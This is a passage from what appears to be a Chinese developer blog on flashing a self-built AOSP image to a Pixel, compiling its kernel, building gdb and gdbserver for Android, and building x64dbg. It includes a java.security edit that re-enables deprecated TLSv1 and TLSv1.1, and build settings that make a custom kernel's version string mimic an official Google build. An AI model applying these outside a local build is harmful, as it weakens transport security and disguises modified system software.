<p>上列命令也可以使用下列命令进行替代</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flashall -w</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：此命令会在当前文件夹中查找全部 img 文件，将这些 img 文件烧写到全部相应的分区中，并又一次启动手机。</p>
</blockquote>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-07-10-49-36.png" class="">

<p>其他命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//清空分区</span><br><span class="line"># fastboot erase boot</span><br><span class="line"># fastboot erase system</span><br><span class="line"># fastboot erase data</span><br><span class="line"># fastboot erase cache</span><br><span class="line">上面的命令也可以简化成一条命令</span><br><span class="line">fastboot erase system -w</span><br><span class="line"></span><br><span class="line">//单刷</span><br><span class="line">//最重要刷boot.img、system.img、userdata.img、vendor.img这四个固件.</span><br><span class="line"># adb reboot bootloader</span><br><span class="line"># fastboot flash boot boot.img</span><br><span class="line"># fastboot flash system system.img</span><br><span class="line"># fastboot flash userdata userdata.img</span><br><span class="line"># fastboot flash vendor vendor.img</span><br><span class="line"># fastboot flash recovery recovery.img //没有编出来，可选</span><br><span class="line"># fastboot flash cache cache.img //没有编出来，可选</span><br><span class="line"># fastboot flash persist persist.img //没有编出来，可选</span><br><span class="line"># fastboot reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>遇到的坑</strong></p>
<p>我的手机版本是 7.1.2 的，然后直接刷机，开机后开机画面一闪而过，然后无限重启循环这个过程。</p>
<p><strong>解决</strong></p>
<p>先刷官方 8.1 的系统，在刷自己编译的 8.1 系统就可以了，具体原因就是 bootloader 没有更新到相应的版本。</p>
<p>下图为刷机成功的的手机系统信息。</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-10-14-05-29.png" class="">

<h1 id="三、编译内核并刷机"><a href="#三、编译内核并刷机" class="headerlink" title="三、编译内核并刷机"></a>三、编译内核并刷机</h1><h2 id="1-获取内核源码"><a href="#1-获取内核源码" class="headerlink" title="1. 获取内核源码"></a>1. 获取内核源码</h2><p>进入到源码根目录下的 kernel 文件夹中执行<code>git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm</code>,就可以下载到相应 msm 的内核源码了。<br>通过<code>https://source.android.com/source/building-kernels</code>页面找到设备对应的源码位置。</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-07-18-13-31.png" class="">

<p>通过<code>git branch -r|grep marlin-kernel</code>命令查找对应的分支，然后通过<code>git checkout remotes/origin/android-msm-marlin-3.18-oreo-mr1</code>切换分支获取到源码。</p>
<h2 id="2-编译"><a href="#2-编译" class="headerlink" title="2. 编译"></a>2. 编译</h2><p>修改内核目录下的 <code>Makefile</code> 文件，修改内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> # Note: Some architectures assign CROSS_COMPILE in their arch/*/Makefile</span><br><span class="line">- ARCH           ?= $(SUBARCH)</span><br><span class="line">- CROSS_COMPILE  ?= $(CONFIG_CROSS_COMPILE:&quot;%&quot;=%)</span><br><span class="line">+ ARCH           ?= arm64</span><br><span class="line">+ CROSS_COMPILE  ?= aarch64-linux-android-</span><br><span class="line">+ SUBARCH           ?= arm64</span><br><span class="line">+ CROSS_COMPILE_ARM32  ?= arm-linux-androideabi-</span><br><span class="line"></span><br><span class="line"> # Architecture as present in compile.</span><br></pre></td></tr></table></figure>

<p>回到<code>aosp</code>目录进行<code>source</code>，<code>lunch</code>操作，然后进入 msm 目录执行<code>make marlin_defconfig</code>，得到<code>.config</code>文件后，直接执行<code>make -j4</code>即可。</p>
<p>在编译过程中出现如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/sh: 1: lz4c: not found</span><br><span class="line">arch/arm64/boot/Makefile:36: recipe for target &#x27;arch/arm64/boot/Image.lz4&#x27; failed</span><br></pre></td></tr></table></figure>

<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-07-15-36-55.png" class="">

<p>显然是<code>lz4c</code>没有找到，应该就是有依赖工具没有安装，通过<code>sudo apt-get install liblz4-tool</code> 安装即可，继续<code>make -j4</code>编译，最后得到<code>arch/arm64/boot/Image.lz4-dtb</code> 。</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-07-15-38-29.png" class="">

<p>将上面编译得到的 Image.lz4-deb 文件复制到 aosp 源码目录下的 device&#x2F;google&#x2F;marlin-kernel 路径即可，然后到 aosp 源码根目录下执行 <code>make bootimage</code> 。</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-07-15-48-06.png" class="">

<p>或者按下列命令生成 boot.img</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export TARGET_PREBUILT_KERNEL=/media/ckcat/other/aosp/msm/arch/arm64/boot/Image.lz4-dtb</span><br><span class="line">rm out/target/product/sailfish/boot.img &amp;&amp;  make bootimage</span><br></pre></td></tr></table></figure>

<p>如果想要替换 <code>boot.img</code> 中的 <code>default.prop</code>,可以在 <code>build/core/Makefile</code> 中搜索关键字 <code>TARGET_RECOVERY_ROOT_OUT)/default.prop</code> 做如下修改，<a href="https://blog.csdn.net/XXOOYC/article/details/85679143">参考</a>:</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-12-26-16-26-31.png" class="">

<p>最后按照前面所写的内容，使用<code>fastboot flash boot_a boot.img</code> 和 <code>fastboot flash boot_b boot.img</code> 刷入即可。如下截图可以看到 kernel 是使用<code>ckcat</code>的机器编译的。</p>
<img src="/2019/11/03/%E7%BC%96%E8%AF%91Android%E7%B3%BB%E7%BB%9F/2019-11-10-14-07-09.png" class="">

<blockquote>
<p>参考: <a href="https://blog4jimmy.com/2018/02/418.html">https://blog4jimmy.com/2018/02/418.html</a></p>
</blockquote>
<h1 id="四、错误处理"><a href="#四、错误处理" class="headerlink" title="四、错误处理"></a>四、错误处理</h1><h2 id="1-flex-2-5-39-loadlocale-c-130-nl-intern-locale-data-Assertioncnt-lt-sizeof-nl-value-type-LC-TIME-sizeof-nl-value-type-LC-TIME-0-39-failed-错误。"><a href="#1-flex-2-5-39-loadlocale-c-130-nl-intern-locale-data-Assertioncnt-lt-sizeof-nl-value-type-LC-TIME-sizeof-nl-value-type-LC-TIME-0-39-failed-错误。" class="headerlink" title="1. flex-2.5.39: loadlocale.c:130: _nl_intern_locale_data: Assertioncnt &lt; (sizeof (_nl_value_type_LC_TIME) / sizeof (_nl_value_type_LC_TIME[0]))&#39; failed. 错误。"></a>1. <code>flex-2.5.39: loadlocale.c:130: _nl_intern_locale_data: Assertioncnt &lt; (sizeof (_nl_value_type_LC_TIME) / sizeof (_nl_value_type_LC_TIME[0]))&#39; failed.</code> 错误。</h2><p>bing 搜索之，在这个<a href="https://stackoverflow.com/questions/49955137/error-when-build-lineageos-make-ninja-wrapper-error-1">链接中找到解法</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LC_ALL=C</span><br></pre></td></tr></table></figure>

<p>把这行代码添加到 bashrc 文件中。<br>实测有效。</p>
<p>那么这句配置是什么意思呢？<br>搜索得到：<br>LC_ALL&#x3D;C 是为了去除所有本地化的设置，让命令能正确执行。</p>
<p><strong>注意</strong></p>
<blockquote>
<p>以上设置可能会导致 gnome-terminal 无法启动，通过 <code>grep &quot;gnome-terminal&quot; /var/log/syslog</code> 查看会发现是 <code>Non UTF-8 locale (ANSI_X3.4-1968) is not supported!</code>。此时删掉刚才设置的 <code>export LC_ALL=C</code> 即可。</p>
</blockquote>
<p>参考： <a href="https://forums.linuxmint.com/viewtopic.php?t=280655">https://forums.linuxmint.com/viewtopic.php?t=280655</a></p>
<blockquote>
<p>原文链接：<a href="https://blog.csdn.net/aaa111/article/details/80330848">https://blog.csdn.net/aaa111/article/details/80330848</a></p>
</blockquote>
<h2 id="2-adb-和-fastboot-都没有权限"><a href="#2-adb-和-fastboot-都没有权限" class="headerlink" title="2. adb 和 fastboot 都没有权限"></a>2. adb 和 fastboot 都没有权限</h2><blockquote>
<p>可以参考 <a href="https://github.com/snowdream/51-android">https://github.com/snowdream/51-android</a> 或者 <a href="https://github.com/M0Rf30/android-udev-rules">https://github.com/M0Rf30/android-udev-rules</a></p>
</blockquote>
<h2 id="3-adb-devices-无法工作。"><a href="#3-adb-devices-无法工作。" class="headerlink" title="3. adb devices 无法工作。"></a>3. adb devices 无法工作。</h2><p>这是因为缺少 USB 驱动的原因，按照以下方法更新</p>
<ol>
<li>打开设备管理器</li>
<li>查找未知的 Android 设备</li>
<li>更新驱动程序</li>
<li>浏览我的计算机以查找驱动程序软件</li>
<li>让我从设备列表中选择，选择列出所有设备</li>
<li>在 Android 设备 或 Google Inc 下，您会找到 Android Bootloader Interface</li>
<li>选择 Android Bootloader 界面</li>
<li>当它说驱动程序可能不兼容时单击 是</li>
</ol>
<p>如果以上步骤 6 无法找到相应的设备，就需要安装对应的设备，参考网站 <a href="https://developer.android.com/studio/run/oem-usb#InstallingDriver">https://developer.android.com/studio/run/oem-usb#InstallingDriver</a> 上的说明进行安装即可。</p>
<blockquote>
<p>参考： <a href="https://stackoverflow.com/questions/8588595/android-fastboot-devices-not-returning-device">https://stackoverflow.com/questions/8588595/android-fastboot-devices-not-returning-device</a></p>
</blockquote>
<h2 id="SSL-error-when-connecting-to-the-Jack-server-Try-‘jack-diagnose’"><a href="#SSL-error-when-connecting-to-the-Jack-server-Try-‘jack-diagnose’" class="headerlink" title="SSL error when connecting to the Jack server. Try ‘jack-diagnose’"></a>SSL error when connecting to the Jack server. Try ‘jack-diagnose’</h2><p>原因就是编译时用的是 open-jdk 8u292，默认禁用了 TLSv1, TLSv1.1，<br>从<code>/etc/java-8-openjdk/security/java.security</code>中取消 TLSv1, TLSv1.1 禁用，<br>修改前</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   jdk.tls.disabledAlgorithms=MD5, SSLv3, DSA, RSA keySize &lt; 2048</span></span><br><span class="line">jdk.tls.disabledAlgorithms=SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, \</span><br><span class="line">    DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, \</span><br><span class="line">    include jdk.disabled.namedCurves</span><br></pre></td></tr></table></figure>

<p>修改后:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   jdk.tls.disabledAlgorithms=MD5, SSLv3, DSA, RSA keySize &lt; 2048</span></span><br><span class="line">jdk.tls.disabledAlgorithms=SSLv3, RC4, DES, MD5withRSA, \</span><br><span class="line">    DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, \</span><br><span class="line">    include jdk.disabled.namedCurves</span><br></pre></td></tr></table></figure>

<p><code>aosp/prebuilts/sdk/tools/</code> 目录下执行 <code>./jack-admin kill-server &amp;&amp; ./jack-admin start-server</code> 成功。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>编译亲儿子内核时简单几步让版本信息和官方镜像一致，而不是显示 <code>-dirty</code> 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell <span class="built_in">cat</span> /proc/version</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KBUILD_BUILD_VERSION=1</span><br><span class="line"><span class="built_in">export</span> KBUILD_BUILD_USER=android-build</span><br><span class="line"><span class="built_in">export</span> KBUILD_BUILD_HOST=xxx.google.com</span><br><span class="line"><span class="built_in">export</span> KBUILD_BUILD_TIMESTAMP=<span class="string">&quot;Web Feb 13 19:10:11 UTC 2019&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/#define LINUX_COMPILER/#define LINUX_COMPILER &quot;</span><span class="string">&#x27;\\&quot;gcc version xxx-google xxx \\(prerelease\\) \\(GCC\\) \\&quot; # /&#x27;</span> scripts/mkcompile_h</span><br><span class="line">make xxx_defconfig</span><br><span class="line">make -j7 KERNELRELEASE=<span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<p>修改了 AOSP 源码之后，比如加了文件，哪怕在一个文件夹下，AS 开发时可以正常引用并使用里面的函数，但是编译时就是报找不到，此时要修改这个文件，将添加的文件包括进去。然后运行一次 <code>make update-api</code>。最后再 <code>m</code> 编译。</p>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android系统编译</tag>
      </tags>
  </entry>
  <entry>
    <title>编译GDB</title>
    <url>/2020/09/14/%E7%BC%96%E8%AF%91GDB/</url>
    <content><![CDATA[<h1 id="编译-gdb-和-gdbserver"><a href="#编译-gdb-和-gdbserver" class="headerlink" title="编译 gdb 和 gdbserver"></a>编译 gdb 和 gdbserver</h1><h2 id="Download-gdb-source-code"><a href="#Download-gdb-source-code" class="headerlink" title="Download gdb source code:"></a>Download gdb source code:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget ftp://sourceware.org/pub/gdb/releases/gdb-9.1.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="Extract-file"><a href="#Extract-file" class="headerlink" title="Extract file:"></a>Extract file:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xzvf gdb-9.1.tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="Move-into-source-folder"><a href="#Move-into-source-folder" class="headerlink" title="Move into source folder"></a>Move into source folder</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gdb-9.1</span><br></pre></td></tr></table></figure>

<h2 id="Edit-file-gdb-gdbserver-linux-low-c"><a href="#Edit-file-gdb-gdbserver-linux-low-c" class="headerlink" title="Edit file gdb/gdbserver/linux-low.c :"></a>Edit file <code>gdb/gdbserver/linux-low.c</code> :</h2><h3 id="Add-two-lines-Line-107-amp-Line-122-with-the-content-below"><a href="#Add-two-lines-Line-107-amp-Line-122-with-the-content-below" class="headerlink" title="Add two lines : Line 107 &amp; Line 122 with the content below"></a>Add two lines : Line 107 &amp; Line 122 with the content below</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define HAVE_ELF32_AUXV_T  //  Line 107 (Added)</span></span><br><span class="line"><span class="comment">#ifndef HAVE_ELF32_AUXV_T</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define HAVE_ELF64_AUXV_T // Line 122 (Added)</span></span><br><span class="line"><span class="comment">#ifndef HAVE_ELF64_AUXV_T</span></span><br></pre></td></tr></table></figure>
<p>This modification is neccessary to build Android, since Android system libraries already define struct Elf32_auxv_t and Elf64_auxv_t .(Please see this for detail: <a href="https://github.com/android/ndk/issues/1008">https://github.com/android/ndk/issues/1008</a>)</p>
<h3 id="Modify-function-linux-request-interrupt"><a href="#Modify-function-linux-request-interrupt" class="headerlink" title="Modify function linux_request_interrupt:"></a>Modify function linux_request_interrupt:</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">linux_request_interrupt</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="comment">/* .... */</span></span><br><span class="line">-  <span class="built_in">kill</span> (-signal_pid, SIGINT); <span class="comment">// replace this line with next 3 lines</span></span><br><span class="line">+  <span class="type">int</span> r = <span class="built_in">kill</span> (-signal_pid, SIGINT);</span><br><span class="line">+  <span class="keyword">if</span> (r != <span class="number">0</span>)</span><br><span class="line">+      <span class="built_in">kill</span> (signal_pid, SIGINT);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>This fixes bug “gdbserver not handling Ctrl+C”, detail at: <a href="https://sourceware.org/bugzilla/show_bug.cgi?id=18772">https://sourceware.org/bugzilla/show_bug.cgi?id=18772</a></p>
<h2 id="Build-gdb-for-linux"><a href="#Build-gdb-for-linux" class="headerlink" title="Build gdb for linux:"></a>Build gdb for linux:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential \</span><br><span class="line">  gcc g++ make autogen m4 \</span><br><span class="line">  bison gettext libpython-dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> build-linux</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> build-linux/</span><br><span class="line"></span><br><span class="line">../configure --enable-targets=all --with-python=/usr/bin/python</span><br><span class="line"></span><br><span class="line">make -j4</span><br><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>我使用 ubuntu 18.04 按照以上编译过程中，出现了一个错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xcoffread.c:180:1: error: invalid conversion from ‘int’ to ‘const char*’ [-fpermissive]</span><br></pre></td></tr></table></figure>
<p>看源码注释，那段代码冒是 XCOFF 文件格式个 dwarf 节， 最后将出错那一行注释掉就好了，不影响使用。</p>
<h2 id="Build-gdbserver-for-android"><a href="#Build-gdbserver-for-android" class="headerlink" title="Build gdbserver for android:"></a>Build gdbserver for android:</h2><h3 id="Download-android-sdk"><a href="#Download-android-sdk" class="headerlink" title="Download android-sdk"></a>Download android-sdk</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> android</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> android</span><br><span class="line"></span><br><span class="line">wget https://dl.google.com/android/repository/commandlinetools-linux-6200805_latest.zip</span><br><span class="line"></span><br><span class="line">unzip commandlinetools-linux-6200805_latest.zip</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/android/tools/bin</span><br></pre></td></tr></table></figure>

<h3 id="Install-Ndk"><a href="#Install-Ndk" class="headerlink" title="Install Ndk"></a>Install Ndk</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sdkmanager --install <span class="string">&quot;ndk;21.0.6113669&quot;</span> --sdk_root=.</span><br></pre></td></tr></table></figure>

<h3 id="Create-standalone-toolchain-for-NDK"><a href="#Create-standalone-toolchain-for-NDK" class="headerlink" title="Create standalone toolchain for NDK"></a>Create standalone toolchain for NDK</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/android/ndk/21.0.6113669/</span><br><span class="line"></span><br><span class="line">./build/tools/make-standalone-toolchain.sh \ </span><br><span class="line">--toolchain=aarch64-linux-android-4.9 \</span><br><span class="line">--install-dir=~/android/ndk_21</span><br></pre></td></tr></table></figure>
<p>This step create the standalone toolchain at: ~&#x2F;android&#x2F;ndk_21</p>
<h3 id="Configure-and-build-gdbserver-for-android"><a href="#Configure-and-build-gdbserver-for-android" class="headerlink" title="Configure and build gdbserver for android"></a>Configure and build gdbserver for android</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/gdb-9.1</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> build-android</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> build-android</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/android/ndk_21/bin</span><br><span class="line"></span><br><span class="line">CC=aarch64-linux-android-gcc ../configure \</span><br><span class="line">    --target=aarch64-linux-android \</span><br><span class="line">    --host=aarch64-linux-android \</span><br><span class="line">     LDFLAGS=<span class="string">&quot;-static-libstdc++&quot;</span></span><br><span class="line"></span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>
<p>If get error related to “source-highlight”, add –disable-source-highlight to the configure flag.</p>
<p>After build finishes, gdbserver is located at: gdb&#x2F;gdbserver&#x2F;gdbserver</p>
<p>编译过程中可能出现错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aarch64.c:50: undefined reference to `set_tdesc_osabi</span><br></pre></td></tr></table></figure>
<p>但是 gdbserver 已经编译好了，所以这个错误可以不用管。</p>
<p>以上参考来自 <a href="https://stackoverflow.com/questions/60973768/build-gdb-and-gdbserver-for-android/61157179#61157179">https://stackoverflow.com/questions/60973768/build-gdb-and-gdbserver-for-android/61157179#61157179</a> 。</p>
<hr>
<p><strong>下面的内容可以忽略</strong></p>
<h1 id="Window-下编译-gdb"><a href="#Window-下编译-gdb" class="headerlink" title="Window 下编译 gdb"></a>Window 下编译 gdb</h1><p><strong>可能会遇到很多坑，不建议。</strong></p>
<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><ol>
<li>安装 MSYS2</li>
</ol>
<p>直接去 <a href="https://www.msys2.org/">https://www.msys2.org/</a> 网站<a href="https://repo.msys2.org/distrib/x86_64/msys2-x86_64-20200903.exe">下载</a>并安装 MSYS2 。</p>
<ol start="2">
<li>安装 mingw64</li>
</ol>
<p>下载 <a href="https://sourceforge.net/projects/mingw-w64/files/">mingw64</a> 并解压到 <code>mingw64/mingw64</code> 目录。</p>
<ol start="3">
<li>安装其他工具</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pacman -S pactoys</span><br><span class="line"># 这里我使用 pacboy 安装了python3和 gcc 无法使用，所以还是使用下列网站的 gcc 吧。</span><br><span class="line"># pacboy -S gcc:x python3:x  # mingw-w64-x86_64-gcc mingw-w64-x86_64-python3</span><br><span class="line">pacman -S make texinfo bison git dejagnu </span><br></pre></td></tr></table></figure>
<p>如果后续编译报错，则根据报错信息安装相应的工具即可。</p>
<p><a href="https://sourceforge.net/projects/mingw-w64/files/">gcc下载地址</a>。</p>
<h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><ol>
<li><p>下载源码<br>直接去官网下载对应的源码 <a href="https://sourceware.org/gdb/">https://sourceware.org/gdb/</a> </p>
</li>
<li><p>启动 <code>msys64/mingw64.exe</code>, 执行下列命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd gdb-9.2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure </span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>等待编译完成。</p>
</li>
</ol>
<h1 id="ubuntu-18-04-下编译"><a href="#ubuntu-18-04-下编译" class="headerlink" title="ubuntu 18.04 下编译"></a>ubuntu 18.04 下编译</h1><p>首先说明一下，由于我编译过 Android 源码，所以可能很多需要的库已经安装了，下面是给出其他博客上的环境配置，仅作参考，不一定需要安装，可以根据编译报错信息搜寻解答方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install texinfo </span><br><span class="line">sudo apt-get install libncurses5-dev </span><br><span class="line">sudo apt-get install m4</span><br><span class="line">sudo apt-get install flex </span><br><span class="line">sudo apt-get install bison</span><br><span class="line">为了支持python脚本扩展功能</span><br><span class="line">apt-get install python-dev</span><br></pre></td></tr></table></figure>
<p>由于我要编译 Android 平台的 gdb 所以使用了 Android 源码中的 gdb 源码，直接使用 gdb 官网的源码应该也不影响。</p>
<blockquote>
<p><a href="https://android.googlesource.com/toolchain/gdb/">https://android.googlesource.com/toolchain/gdb/</a>  Android 源码中的 gdb 。<br><a href="https://sourceware.org/gdb/">https://sourceware.org/gdb/</a>    gdb 官网。</p>
</blockquote>
<p>好了废话了那么多，那么开始编译吧。可以按照如下命令进行编译，其中当前目录为 gdb 源码根目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">mkdir</span> build</span><br><span class="line">➜  <span class="built_in">cd</span> build</span><br><span class="line">➜  ../configure --with-python=/usr/bin/python3.6 --target=arm-linux-androideabi --prefix=/home/ckcat/tools/gdb9.2</span><br><span class="line">➜  make -j8</span><br></pre></td></tr></table></figure>
<p>编译成功后，<code>build/gdb</code> 目录下会出现 gdb 的二进制可执行文件。</p>
<p>简单的说一下 configure 的参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--with-python=/usr/bin/python3.6     <span class="comment"># gdb 支持python3</span></span><br><span class="line">--target=arm-linux-androideabi    <span class="comment"># 目标平台为 Android ARM 如果需要支持aarch64，将参数改为 aarch64-linux-android 即可。</span></span><br><span class="line">--prefix=/home/ckcat/tools/gdb9.2    <span class="comment"># make install 安装目录</span></span><br></pre></td></tr></table></figure>
<p>当执行 <code>make install</code> 命令后，可以看到 <code>/home/ckcat/tools/gdb9.2</code> 已经包含了 gdb 相关文件。</p>
<p>如果目标平台为全平台，则应该用下面参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">../configure --with-python=/usr/bin/python3.6 --enable-targets=all --prefix=/home/ckcat/tools/gdb9.2</span><br></pre></td></tr></table></figure>

<p>说一下我在编译过程中碰到的错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Makefile:541: recipe <span class="keyword">for</span> target <span class="string">&#x27;bfd.info&#x27;</span> failed</span><br></pre></td></tr></table></figure>
<p>这个错误说明没有安装 texinfo 库，安装一下就好了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">configure: error: no usable python found at /usr</span><br></pre></td></tr></table></figure>
<p>这个错误是因为我之前的参数 <code>--with-python=/usr</code> 没有指定对应的 python 文件。后面修改为  <code>--with-python=/usr/bin/python3.6 </code> 就可以了。</p>
<p>参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sourceware.org/gdb/wiki/BuildingOnWindows</span><br><span class="line">https://blog.csdn.net/pfysw/article/details/105451883</span><br><span class="line">https://github.com/ikonst/gdb-7.7-android</span><br><span class="line">https://www.msys2.org/</span><br><span class="line">https://www.cntofu.com/book/46/gdb/188.md</span><br><span class="line">https://mudongliang.github.io/2017/08/12/compile-gdb-with-python-script-support.html</span><br><span class="line">https://stackoverflow.com/questions/60973768/build-gdb-and-gdbserver-for-android</span><br><span class="line">https://medium.com/@k3vinlusec/how-to-compile-gdb-9-x-and-gdbserver-for-android-24ef6625ee9a</span><br><span class="line">https://segmentfault.com/a/1190000021029824</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Debug</tag>
      </tags>
  </entry>
  <entry>
    <title>编译x64dbg</title>
    <url>/2021/11/09/%E7%BC%96%E8%AF%91x64dbg/</url>
    <content><![CDATA[<p>编译环境：VS2019 + QT5.15.2</p>
<p>参考： <a href="https://github.com/x64dbg/x64dbg/wiki/Compiling-the-whole-project">https://github.com/x64dbg/x64dbg/wiki/Compiling-the-whole-project</a></p>
<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><ol>
<li><p>下载源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recurse-submodules -b development https://github.com/x64dbg/x64dbg.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置好 VS2019 + QT5.15.2 的环境。</p>
</li>
</ol>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ol>
<li><p>在 x64dbg 源码目录运行 <code>install.bat</code> 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ install.bat</span><br><span class="line">Run this to install the auto-format hook.</span><br><span class="line">已复制         1 个文件。</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行 <code>setupdeps.bat</code> 复制依赖库。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ setupdeps.bat</span><br><span class="line">deps\x32\asmjit.dll</span><br><span class="line">deps\x32\dbghelp.dll</span><br><span class="line">deps\x32\DeviceNameResolver.dll</span><br><span class="line">deps\x32\jansson.dll</span><br><span class="line">deps\x32\ldconvert.dll</span><br><span class="line">deps\x32\libeay32.dll</span><br><span class="line">deps\x32\lz4.dll</span><br><span class="line">deps\x32\msdia140.dll</span><br><span class="line">deps\x32\msvcp120.dll</span><br><span class="line">deps\x32\msvcr120.dll</span><br><span class="line">deps\x32\Qt5Core.dll</span><br><span class="line">deps\x32\Qt5Gui.dll</span><br><span class="line">deps\x32\Qt5Network.dll</span><br><span class="line">deps\x32\Qt5Widgets.dll</span><br><span class="line">deps\x32\Qt5WinExtras.dll</span><br><span class="line">deps\x32\Scylla.dll</span><br><span class="line">deps\x32\ssleay32.dll</span><br><span class="line">deps\x32\symsrv.dll</span><br><span class="line">deps\x32\TitanEngine.dll</span><br><span class="line">deps\x32\x32_bridge.dll</span><br><span class="line">deps\x32\x32_dbg.dll</span><br><span class="line">deps\x32\XEDParse.dll</span><br><span class="line">deps\x32\yara.dll</span><br><span class="line">deps\x32\GleeBug\TitanEngine.dll</span><br><span class="line">deps\x32\platforms\qwindows.dll</span><br><span class="line">deps\x32\StaticEngine\TitanEngine.dll</span><br><span class="line">复制了 26 个文件</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 VS2019 打开 <code>x64dbg.sln</code> ，依次选择需要编译的 Project，进入 Project–&gt;Property 选项，将 Platform Toolset 设置为 Visual Studio 2019 (v142)，然后直接编译。</p>
</li>
<li><p>使用 qt creator 打开 <code>src/gui/x64dbg.pro</code>，配置好编译选项，直接编译。</p>
</li>
<li><p>编译完成后，运行 <code>windeployqt.exe --force x64gui.dll</code> 命令，获取相应的依赖库。</p>
